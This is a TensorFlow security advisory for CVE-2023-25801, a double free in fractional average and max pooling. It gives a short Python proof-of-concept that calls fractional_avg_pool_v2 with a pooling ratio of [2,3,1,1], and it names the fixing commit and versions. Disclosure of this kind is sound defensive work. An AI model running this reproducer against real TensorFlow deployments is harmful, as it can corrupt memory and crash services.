## TFSA-2023-173: Double free in Fractional(Max/Avg)Pool

### CVE Number
CVE-2023-25801

### Impact
`nn_ops.fractional_avg_pool_v2` and `nn_ops.fractional_max_pool_v2` require the first and fourth elements of their parameter `pooling_ratio` to be equal to 1.0, as pooling on batch and channel dimensions is not supported.

```python
import tensorflow as tf
import os
import numpy as np
from tensorflow.python.ops import nn_ops
try:
  arg_0_tensor = tf.random.uniform([3, 30, 50, 3], dtype=tf.float64)
  arg_0 = tf.identity(arg_0_tensor)
  arg_1_0 = 2
  arg_1_1 = 3
  arg_1_2 = 1
  arg_1_3 = 1
  arg_1 = [arg_1_0,arg_1_1,arg_1_2,arg_1_3,]
  arg_2 = True
  arg_3 = True
  seed = 341261001
  out = nn_ops.fractional_avg_pool_v2(arg_0,arg_1,arg_2,arg_3,seed=seed,)
except Exception as e:
  print("Error:"+str(e))
```

### Patches
We have patched the issue in GitHub commit [ee50d1e00f81f62a4517453f721c634bbb478307](https://github.com/tensorflow/tensorflow/commit/ee50d1e00f81f62a4517453f721c634bbb478307).

The fix will be included in TensorFlow 2.12. We will also cherrypick this commit on TensorFlow 2.11.1.
